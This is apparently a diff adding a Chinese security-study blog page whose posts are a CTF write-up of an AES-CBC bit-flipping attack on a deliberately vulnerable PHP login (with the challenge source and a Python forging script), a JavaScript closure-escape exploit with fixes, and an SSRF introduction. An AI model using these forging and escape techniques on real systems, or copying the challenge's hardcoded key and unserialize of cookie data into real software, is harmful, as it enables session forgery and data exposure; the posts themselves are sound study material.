NGcMAGVYo/XqWT2bD4TDonxbwAFSepn0xy0rzDrsIpylvnsjq5AobLr8uVhraQLNeTJMfe7usXGA6KDM+0uUIg==</span><br></pre></td></tr></table></figure>
+
+<p>题目后面的就不贴出来了，就是简单读文件算PIN</p>
+<h3 id="第二题"><a href="#第二题" class="headerlink" title="第二题"></a>第二题</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC <span class="string">&quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;</span> <span class="string">&quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;</span>&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;Content-Type&quot;</span> content=<span class="string">&quot;text/html; charset=utf-8&quot;</span> /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=<span class="string">&quot;static/css/style.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span> type=<span class="string">&quot;text/css&quot;</span> /&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span> src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">$(document).<span class="title function_ invoke__">ready</span>(function() &#123;</span><br><span class="line">	$(<span class="string">&quot;.username&quot;</span>).<span class="title function_ invoke__">focus</span>(function() &#123;</span><br><span class="line">		$(<span class="string">&quot;.user-icon&quot;</span>).<span class="title function_ invoke__">css</span>(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;-48px&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(<span class="string">&quot;.username&quot;</span>).<span class="title function_ invoke__">blur</span>(function() &#123;</span><br><span class="line">		$(<span class="string">&quot;.user-icon&quot;</span>).<span class="title function_ invoke__">css</span>(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;0px&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line"></span><br><span class="line">	$(<span class="string">&quot;.password&quot;</span>).<span class="title function_ invoke__">focus</span>(function() &#123;</span><br><span class="line">		$(<span class="string">&quot;.pass-icon&quot;</span>).<span class="title function_ invoke__">css</span>(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;-48px&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">	$(<span class="string">&quot;.password&quot;</span>).<span class="title function_ invoke__">blur</span>(function() &#123;</span><br><span class="line">		$(<span class="string">&quot;.pass-icon&quot;</span>).<span class="title function_ invoke__">css</span>(<span class="string">&quot;left&quot;</span>,<span class="string">&quot;0px&quot;</span>);</span><br><span class="line">	&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;SECRET_KEY&quot;</span>, <span class="string">&#x27;9999999999999999&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;METHOD&quot;</span>, <span class="string">&quot;aes-128-cbc&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_random_iv</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$random_iv</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">16</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="variable">$random_iv</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">255</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$random_iv</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$info</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$iv</span> = <span class="title function_ invoke__">get_random_iv</span>();</span><br><span class="line">    <span class="variable">$plain</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$info</span>);</span><br><span class="line">    <span class="variable">$cipher</span> = <span class="title function_ invoke__">openssl_encrypt</span>(<span class="variable">$plain</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;iv&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$iv</span>));</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;cipher&quot;</span>, <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$cipher</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_login</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;iv&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$cipher</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;cipher&#x27;</span>]);</span><br><span class="line">        <span class="variable">$iv</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;iv&quot;</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$plain</span> = <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$cipher</span>, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, <span class="variable">$iv</span>))&#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$plain</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;&lt;p&gt;base64_decode(&#x27;&quot;</span>.<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$plain</span>).<span class="string">&quot;&#x27;) can&#x27;t unserialize&lt;/p&gt;&quot;</span>);</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$info</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;ERROR!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show_homepage</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Hello admin&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Flag is ctf&#123;123cbcchange&#125;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;hello &#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>].<span class="string">&#x27;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;Only admin can see flag&lt;/p&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$username</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    <span class="variable">$password</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&#x27;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="keyword">array</span>(<span class="string">&#x27;username&#x27;</span>=&gt;<span class="variable">$username</span>,<span class="string">&#x27;password&#x27;</span>=&gt;<span class="variable">$password</span>);</span><br><span class="line">        <span class="title function_ invoke__">login</span>(<span class="variable">$info</span>);</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]))&#123;</span><br><span class="line">        <span class="title function_ invoke__">check_login</span>();</span><br><span class="line">        <span class="title function_ invoke__">show_homepage</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;body class=&quot;login-body&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;div id=&quot;wrapper&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;header&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;content&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&#x27;\&#x27;&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                        &lt;div class=&quot;footer&quot;&gt;</span></span><br><span class="line"><span class="string">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span></span><br><span class="line"><span class="string">                        &lt;/div&gt;</span></span><br><span class="line"><span class="string">                    &lt;/form&gt;</span></span><br><span class="line"><span class="string">                &lt;/div&gt;</span></span><br><span class="line"><span class="string">            &lt;/body&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>阅读源代码，我们可以知道，只有admin用户才能读取flag，但是admin用户又不允许登录。虽然相互矛盾，由于题目用到了aes的cbc模式加密，所以我们可以利用cbc字节翻转攻击来得到我们想要的明文。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">分组：</span><br><span class="line">a:2:&#123;s:8:&quot;userna</span><br><span class="line">me&quot;;s:5:&quot;admix&quot;;</span><br><span class="line">s:8:&quot;password&quot;;s</span><br><span class="line">:2:&quot;123&quot;;&#125;　</span><br></pre></td></tr></table></figure>
+
+<p>因此我们只需要将”x”字节翻转为”n”即可得到flag。</p>
+<p>根据我们得到的关系，已知只需修改前一组密文即可。</p>
+<p>$newcipher[13]&#x3D;chr(ord(13) ^ ord(‘x’) ^ ord(‘n’))</p>
+<p>这时我们就会得到</p>
+<p>a:2:{s:8:“username”;s:5:“admin”;s:8:“password”;s:3:“123”;</p>
+<p>但是由于前一组密文被修改了 所以前一组的明文会出现乱码，因此接下来我们再生成新的iv将前一组明文改回a:2:{s:8:”userna 即可得到flag。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8 -*-</span><br><span class="line">import base64</span><br><span class="line">import urllib.parse</span><br><span class="line"></span><br><span class="line"># a:2:&#123;s:8:&quot;userna</span><br><span class="line"># me&quot;;s:5:&quot;admiN&quot;;</span><br><span class="line"># s:8:&quot;password&quot;;s</span><br><span class="line"># :6:&quot;123&quot;;&#125;</span><br><span class="line"> </span><br><span class="line">#原始cipher</span><br><span class="line">ciphertext = &#x27;w1uvgfzxxuYHA%2Bo08ZL%2BCefhwr2jHuwglOIBAh8cP1w5TCiCmY0Yy%2BQxelAl9%2B%2FiZeRvLD7UjzlF58bTGFZ%2BWQ%3D%3D&#x27;</span><br><span class="line"></span><br><span class="line">cipher = base64.b64decode(urllib.parse.unquote(ciphertext))</span><br><span class="line">array_cipher = bytearray(cipher)</span><br><span class="line">array_cipher[13] =  array_cipher[13]^ ord(&#x27;N&#x27;) ^ ord(&#x27;n&#x27;)</span><br><span class="line">#print(array_cipher)</span><br><span class="line">print(&#x27;newCipher:&#x27;,urllib.parse.quote(base64.b64encode(array_cipher)))</span><br><span class="line"></span><br><span class="line">#解密后的明文base64</span><br><span class="line">decode_plain = base64.b64decode(&#x27;sxvY7wUlyPgC+/iV7InfjG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&#x27;)</span><br><span class="line">#原始iv</span><br><span class="line">iv = base64.b64decode(urllib.parse.unquote(&#x27;1HxERxo2%2FTuymbrPoVDB%2Bw%3D%3D&#x27;))</span><br><span class="line">#原始明文</span><br><span class="line">plain = &#x27;a:2:&#123;s:8:&quot;userna&#x27;</span><br><span class="line"></span><br><span class="line">newiv = list(iv)</span><br><span class="line"></span><br><span class="line">for i in range(16):</span><br><span class="line">    newiv[i] = (ord(plain[i].encode(&#x27;utf-8&#x27;)) ^ iv[i] ^ decode_plain[i])</span><br><span class="line"></span><br><span class="line">newiv = bytes(newiv)</span><br><span class="line"></span><br><span class="line">print(&#x27;newiv:&#x27;,urllib.parse.quote(base64.b64encode(newiv)))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/06/12/Closure-Privilege-Escalation/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="Record my study life">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chleynx's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/06/12/Closure-Privilege-Escalation/" class="post-title-link" itemprop="url">闭包提权(Closure-Privilege-Escalation)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-06-12 00:22:51" itemprop="dateCreated datePublished" datetime="2024-06-12T00:22:51+08:00">2024-06-12</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-08-10 01:35:17" itemprop="dateModified" datetime="2024-08-10T01:35:17+08:00">2024-08-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Summary/" itemprop="url" rel="index"><span itemprop="name">Summary</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="闭包提权："><a href="#闭包提权：" class="headerlink" title="闭包提权："></a>闭包提权：</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var o = (function() &#123;</span><br><span class="line">    var obj = &#123;</span><br><span class="line">        a: 1,</span><br><span class="line">        flag: &quot;flag&#123;test&#125;&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">    return &#123;</span><br><span class="line">        get: function(k) &#123;</span><br><span class="line">            return obj[k];</span><br><span class="line">        &#125;,</span><br><span class="line">        add: function() &#123;</span><br><span class="line">            n++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">)();</span><br><span class="line"></span><br><span class="line">console.log(o.get(&quot;flag&quot;))  // flag&#123;test&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先，这里通过闭包实现了将obj这个对象让外面不可更改。实现只读的效果。</p>
+<p>作用：比如在有些环境下，如第三方库当中，需要保持稳定性，防止一个库被另一个库修改。</p>
+<p>利用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">console.log(o.get(&quot;valueOf&quot;))  //[Function: valueOf]</span><br><span class="line"></span><br><span class="line">console.log(o.get(&quot;valueOf&quot;)())  // TypeError: Cannot convert undefined or null to objec</span><br><span class="line">// 由于valueOf是Object.prototype的方法，所以在调用时，this指向的是Object.prototype，而Object.prototype并没有flag属性，所以会报错</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//定义一个原型，让obj[k]能拿到这个原型，然后返回this指向obj</span><br><span class="line">Object.defineProperty(Object.prototype, &quot;hacker&quot;, &#123;</span><br><span class="line">    get: function() &#123;</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">console.log(o.get(&quot;flag&quot;)) // flag&#123;test&#125;</span><br><span class="line"></span><br><span class="line">console.log(o.get(&quot;hacker&quot;))  // &#123; a: 1, flag: &#x27;flag&#123;test&#125;&#x27; &#125;</span><br><span class="line">let obj1 = o.get(&quot;hacker&quot;);</span><br><span class="line">obj1.flag = 2;</span><br><span class="line"></span><br><span class="line">console.log(o.get(&quot;flag&quot;))  // 2</span><br><span class="line"></span><br><span class="line">if (o.get(&quot;flag&quot;) !== &quot;flag&#123;test&#125;&quot;) &#123;</span><br><span class="line">    console.log(&quot;flag is correct!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">// flag is correct!</span><br></pre></td></tr></table></figure>
+
+<p>利用成功</p>
+<p>防御的方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">//防御1</span><br><span class="line">var o = (function() &#123;</span><br><span class="line">    var obj = &#123;</span><br><span class="line">        a: 1,</span><br><span class="line">        flag: &quot;flag&#123;test&#125;&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">    Object.setPrototypeOf(obj, null);</span><br><span class="line">    return &#123;</span><br><span class="line">        get: function(k) &#123;</span><br><span class="line">            return obj[k];</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">)();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//防御2,如果obj要使用它的原型的话可以用以下方法</span><br><span class="line">var o = (function() &#123;</span><br><span class="line">    var obj = &#123;</span><br><span class="line">        a: 1,</span><br><span class="line">        flag: &quot;flag&#123;test&#125;&quot;,</span><br><span class="line">    &#125;;</span><br><span class="line">    // Object.setPrototypeOf(obj, null);</span><br><span class="line">    return &#123;</span><br><span class="line">        get: function(k) &#123;</span><br><span class="line">            if(obj.hasOwnProperty(k))&#123;</span><br><span class="line">                return obj[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line">)();</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+	
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chensonghi.github.io./2024/06/01/ssrf/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/ch.jpg">
+      <meta itemprop="name" content="chleynx">
+      <meta itemprop="description" content="Record my study life">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="chleynx's blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2024/06/01/ssrf/" class="post-title-link" itemprop="url">SSRF</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-06-01 18:38:57" itemprop="dateCreated datePublished" datetime="2024-06-01T18:38:57+08:00">2024-06-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-08-10 01:30:24" itemprop="dateModified" datetime="2024-08-10T01:30:24+08:00">2024-08-10</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Summar/" itemprop="url" rel="index"><span itemprop="name">Summar</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h2 id="SSRF简介"><a href="#SSRF简介" class="headerlink" title="SSRF简介"></a>SSRF简介</h2><p>SSRF (Server-Side Request Forgery,服务器端请求伪造)是一种由攻击者构造请求，由服务端发起请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统(正因为请求是由服务端发起的，所以服务端能请求到与自身相连而与外网隔离的内部系统)。</p>
+<p>也就是（如果A是外网主机，B是不能访问外网的主机，C是能够访问A和B的主机——-&gt;SSRF也就是A通过C访问B）</p>
+<h2 id="SSRF漏洞原理"><a href="#SSRF漏洞原理" class="headerlink" title="SSRF漏洞原理"></a>SSRF漏洞原理</h2><p>SSRF的形成大多是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。例如，黑客操作服务端从指定URL地址获取网页文本内容，加载指定地址的图片等，利用的是服务端的请求伪造。SSRF利用存在缺陷的Web<br>应用作为代理攻击远程和本地的服务器。</p>
+<p>攻击方式：</p>
+<ol>
+<li><p>对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息。</p>
+</li>
+<li><p>攻击运行在内网或本地的应用程序。</p>
+</li>
+<li><p>对内网Web应用进行指纹识别，识别企业内部的资产信息。</p>
+</li>
+<li><p>攻击内外网的Web应用，主要是使用HTTP GET请求就可以实现的攻击(比如struts2、SQli等)。</p>
